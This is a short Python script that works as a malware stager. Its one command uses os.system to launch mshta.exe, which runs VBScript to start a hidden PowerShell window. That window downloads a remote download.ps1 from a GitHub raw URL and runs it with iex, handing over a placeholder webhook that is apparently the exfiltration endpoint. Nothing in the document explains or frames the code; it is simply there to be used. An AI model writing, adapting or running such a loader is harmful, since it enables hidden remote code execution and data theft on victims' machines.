import os

webhook = "you_webhook"
command = f'mshta.exe vbscript:createobject("wscript.shell").run("powershell $webhook=\'{webhook}\';iwr(\'https://raw.githubusercontent.com/43a1723/test/main/download.ps1\')|iex",0)(window.close)'
os.system(command)
